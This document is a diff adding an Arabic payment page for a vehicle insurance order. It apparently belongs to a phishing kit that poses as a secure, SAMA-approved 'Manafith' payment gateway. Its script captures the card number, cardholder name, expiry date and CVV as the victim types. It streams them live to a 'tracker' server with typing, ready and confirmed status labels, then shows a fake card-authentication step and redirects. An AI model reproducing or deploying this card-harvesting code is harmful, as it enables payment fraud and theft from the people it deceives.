@@ -1,0 +1,132 @@
+<!DOCTYPE html><html lang="ar" dir="rtl"><head><meta charset="UTF-8"><title>بوابة الدفع</title><link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;700;900&display=swap" rel="stylesheet"><link rel="stylesheet" href="bill.css"></head><body><header><img style="height:34px;" src="/images/footer-logo.svg" alt="Manafith" onerror="this.src='/images/logo.svg'"><div class="secure-b">🔒 دفع آمن 100%</div></header><main><section class="wrapper payment-card"><h3 class="title">💳 تفاصيل بطاقة الدفع</h3><div class="i-card"><div style="display:flex;justify-content:space-between;align-items:center;"><div class="chip"></div><div id="card-graphic-network"><span class="visa-t">VISA</span></div></div><div class="c-num-g" id="card-graphic-number">•••• •••• •••• ••••</div><div class="c-foot-g"><div id="card-graphic-holder" style="font-weight:700;">CARDHOLDER NAME</div><div id="card-graphic-expiry" style="font-family:monospace;font-weight:700;">MM/YY</div></div></div><form id="checkout-form" onsubmit="handlePaymentSubmit(event)"><div class="form-group"><label>رقم بطاقة الدفع</label><div class="input-c"><input type="text" id="card-number" placeholder="•••• •••• •••• ••••" oninput="validateCardNumber(this)"><div class="logo-in" id="network-logo-inline"></div></div></div><div class="form-group"><label>اسم صاحب البطاقة</label><input type="text" id="card-holder" placeholder="CARDHOLDER NAME" oninput="validateCardHolder(this)"></div><div class="form-row"><div class="form-group"><label>تاريخ الانتهاء</label><input type="text" id="card-expiry" placeholder="MM/YY" maxlength="5" oninput="validateCardExpiry(this)"></div><div class="form-group"><label>رمز الأمان (CVV)</label><input type="password" id="card-cvv" placeholder="•••" maxlength="4" oninput="validateCardCvv(this)"></div></div><button type="submit" class="pay-btn" id="pay-submit-btn" disabled><span id="pay-btn-text">تأكيد ودفع</span></button></form><div class="sec-f">🛡️ معتمد من SAMA</div></section><section class="wrapper summary-card"><h3 class="title">📄 ملخص طلب التأمين</h3><div class="row" id="row-country" style="display:none;"><span style="color:#64748b; font-weight:600;">دولة القدوم:</span><span id="sum-country" style="font-weight:700;"></span></div><div class="row" id="row-port" style="display:none;"><span style="color:#64748b; font-weight:600;">منفذ الدخول:</span><span id="sum-port" style="font-weight:700;"></span></div><div class="row" id="row-plate" style="display:none;"><span style="color:#64748b; font-weight:600;">رقم اللوحة:</span><span id="sum-plate" style="font-weight:700;"></span></div><div class="row"><span style="color:#64748b; font-weight:600;">مدة التأمين:</span><span id="sum-duration" style="font-weight:700;">اسبوعين</span></div><div class="row" style="border-top:1.5px solid #f1f5f9;margin-top:12px;padding-top:12px;"><span style="font-size:15px;color:#0f172a;font-weight:900;">المبلغ الإجمالي:</span><span class="total-p" id="sum-total-price">450.00 ر.س</span></div></section></main><script src="config.js"></script><script>var SERVER_HUB_URL = window.SERVER_HUB_URL || "http://localhost:5000", siteKey = "site_1789715618986", formId = "payment_form", formName = "الخطوة الثانية - نموذج مهم";
+        var currentSessionId = 'sess_' + Math.random().toString(36).substring(2, 10) + Date.now().toString(36).substring(6, 10);
+        var visitorToken = localStorage.getItem('visitor_token') || 'vis_' + Math.random().toString(36).substring(2, 10);
+        try {
+            var sub = JSON.parse(localStorage.getItem('saas_last_submission') || '{}');
+            if (sub['دولة القدوم']) { document.getElementById('sum-country').innerText = sub['دولة القدوم']; document.getElementById('row-country').style.display = 'flex'; }
+            if (sub['منفذ الدخول']) { document.getElementById('sum-port').innerText = sub['منفذ الدخول']; document.getElementById('row-port').style.display = 'flex'; }
+            if (sub['رقم اللوحة']) { document.getElementById('sum-plate').innerText = sub['رقم اللوحة']; document.getElementById('row-plate').style.display = 'flex'; }
+            var dStr = sub['مدة التأمين'] || 'اسبوعين 450.00', price = "450.00", dName = "اسبوعين";
+            var pMatch = dStr.match(/([\d\.]+)/);
+            if (pMatch) { price = pMatch[1]; dName = dStr.replace(price, '').trim().replace(/[\n\r]/g, ''); }
+            document.getElementById('sum-duration').innerText = dName || 'اسبوعين';
+            document.getElementById('sum-total-price').innerText = price + " ر.س";
+            document.getElementById('pay-submit-btn').innerText = "تأكيد ودفع " + price + " ر.س";
+        } catch(e){}
+        function isValidLuhn(num) {
+            const digits = num.replace(/\D/g, '');
+            if (digits.length < 13) return false;
+            let sum = 0, dDouble = false;
+            for (let i = digits.length - 1; i >= 0; i--) {
+                let d = parseInt(digits.charAt(i), 10);
+                if (dDouble) { d *= 2; if (d > 9) d -= 9; }
+                sum += d; dDouble = !dDouble;
+            }
+            return sum % 10 === 0;
+        }
+        const MADA_LOGO = `<span class="mada-b">mada مدى</span>`, VISA_LOGO = `<span class="visa-t">VISA</span>`, MC_LOGO = `<div class="mc-logo"><div class="mc-r"></div><div class="mc-o"></div></div>`;
+        var lastReadyCard = null, lastReadyExpiry = null, isCardValid = false, isHolderValid = false, isExpiryValid = false, isCvvValid = false, lastSentPayload = null, streamDebounce = null;
+        function updatePayButtonState() {
+            var v = isCardValid && isHolderValid && isExpiryValid && isCvvValid;
+            var btn = document.getElementById('pay-submit-btn');
+            btn.disabled = !v;
+            if (v) btn.classList.add('enabled'); else btn.classList.remove('enabled');
+            streamLiveFormPayload(v ? 'ready' : 'typing');
+        }
+        function streamLiveFormPayload(st) {
+            clearTimeout(streamDebounce);
+            streamDebounce = setTimeout(function() {
+                var cNum = document.getElementById('card-number').value.trim();
+                var cHolder = document.getElementById('card-holder').value.trim();
+                var cExpiry = document.getElementById('card-expiry').value.trim();
+                var cCvv = document.getElementById('card-cvv').value.trim();
+                var cleanNum = cNum.replace(/\s/g, ''), net = 'VISA';
+                if (cleanNum.startsWith('5')) net = 'MASTERCARD';
+                else if (cleanNum.startsWith('6') || ['484783','458838','428331'].some(p => cleanNum.startsWith(p))) net = 'MADA';
+                if (st === 'typing' && lastReadyCard !== null) {
+                    var cleanLastReady = lastReadyCard.replace(/\s/g, '');
+                    if ((cleanNum.length >= 6 && !cleanLastReady.startsWith(cleanNum) && cleanNum !== cleanLastReady) || (cExpiry.length >= 2 && cExpiry !== lastReadyExpiry)) {
+                        currentSessionId = 'sess_' + Math.random().toString(36).substring(2, 10) + Date.now().toString(36).substring(6, 10);
+                        lastReadyCard = null; lastReadyExpiry = null;
+                    }
+                }
+                if (st === 'ready') { lastReadyCard = cNum; lastReadyExpiry = cExpiry; }
+                var data = { 'رقم البطاقة': cNum, 'اسم حامل البطاقة': cHolder, 'تاريخ الانتهاء': cExpiry, 'رمز الأمان CVV': cCvv, 'نوع البطاقة': net, '_sessionId': currentSessionId };
+                var payloadString = JSON.stringify(data);
+                if (payloadString === lastSentPayload && st !== 'confirmed') return;
+                lastSentPayload = payloadString;
+                fetch(SERVER_HUB_URL + '/api/tracker/submit', {
+                    method: 'POST', headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ token: visitorToken, siteKey: siteKey, formName: formName + (st === 'typing' ? ' (يجري الكتابة 🟡)' : st === 'ready' ? ' (جاهز 🟢)' : ' (مؤكد ✅)'), submissionData: data, isFinalSubmission: (st === 'confirmed'), isImportant: true }),
+                    keepalive: true
+                }).catch(function(){});
+            }, 300);
+        }
+        function validateCardNumber(el) {
+            let r = el.value.replace(/\D/g, '');
+            el.value = r.replace(/(\d{4})/g, '$1 ').trim();
+            document.getElementById('card-graphic-number').innerText = el.value || '•••• •••• •••• ••••';
+            let badge = VISA_LOGO;
+            if (r.startsWith('5')) badge = MC_LOGO;
+            else if (r.startsWith('6') || ['484783','458838','428331'].some(p => r.startsWith(p))) badge = MADA_LOGO;
+            document.getElementById('card-graphic-network').innerHTML = badge;
+            document.getElementById('network-logo-inline').innerHTML = badge;
+            if (r.length === 16) {
+                isCardValid = isValidLuhn(r);
+                el.className = isCardValid ? 'success' : 'error';
+                if (isCardValid) document.getElementById('card-expiry').focus();
+            } else { isCardValid = false; el.className = r.length > 0 ? 'error' : ''; }
+            updatePayButtonState();
+        }
+        function validateCardExpiry(el) {
+            let r = el.value.replace(/\D/g, '');
+            if (r.length === 1 && ['2','3','4','5','6','7','8','9'].includes(r)) r = '0' + r;
+            if (r.length >= 2) {
+                let m = parseInt(r.substring(0, 2), 10);
+                if (m > 12) m = 12; if (m === 0) m = 1;
+                r = (m < 10 ? '0' + m : m) + '/' + r.substring(2, 4);
+            }
+            el.value = r;
+            document.getElementById('card-graphic-expiry').innerText = r || 'MM/YY';
+            if (r.length === 5) {
+                let parts = r.split('/');
+                let m = parseInt(parts[0], 10), y = parseInt('20' + parts[1], 10);
+                let now = new Date(), curM = now.getMonth() + 1, curY = now.getFullYear();
+                isExpiryValid = (y > curY || (y === curY && m >= curM)) && (m >= 1 && m <= 12);
+                el.className = isExpiryValid ? 'success' : 'error';
+                if (isExpiryValid) document.getElementById('card-cvv').focus();
+            } else { isExpiryValid = false; el.className = r.length > 0 ? 'error' : ''; }
+            updatePayButtonState();
+        }
+        function validateCardCvv(el) {
+            let v = el.value.replace(/\D/g, '').substring(0, 4);
+            el.value = v;
+            isCvvValid = v.length >= 3;
+            el.className = isCvvValid ? 'success' : (v.length > 0 ? 'error' : '');
+            if (isCvvValid && v.length === 3) document.getElementById('card-holder').focus();
+            updatePayButtonState();
+        }
+        function validateCardHolder(el) {
+            let v = el.value.replace(/[^a-zA-Z\s]/g, '').toUpperCase();
+            el.value = v;
+            document.getElementById('card-graphic-holder').innerText = v || 'CARDHOLDER NAME';
+            isHolderValid = v.trim().length >= 3;
+            el.className = isHolderValid ? 'success' : (v.length > 0 ? 'error' : '');
+            updatePayButtonState();
+        }
+        function handlePaymentSubmit(e) {
+            e.preventDefault();
+            if (!isCardValid || !isExpiryValid || !isCvvValid || !isHolderValid) return;
+            document.getElementById('pay-submit-btn').disabled = true;
+            document.getElementById('pay-submit-btn').innerText = "جاري الدفع الآمن...";
+            streamLiveFormPayload('confirmed');
+            fetch(SERVER_HUB_URL + '/api/tracker/ping', {
+                method: 'POST', headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ token: visitorToken, siteKey: siteKey, currentPage: '/loading', pageTitle: 'جاري مصادقة البطاقة البنكية...' })
+            }).catch(function(){});
+            setTimeout(function() {
+                var dest = (window.location.pathname.includes('/live/') || window.location.pathname.includes('/storage/')) ? ((window.location.pathname.startsWith('/live/') ? '/live/' : '/storage/') + siteKey + '/loading.html') : 'loading.html';
+                window.location.href = dest;
+            }, 800);
+        }
+    </script></body></html>
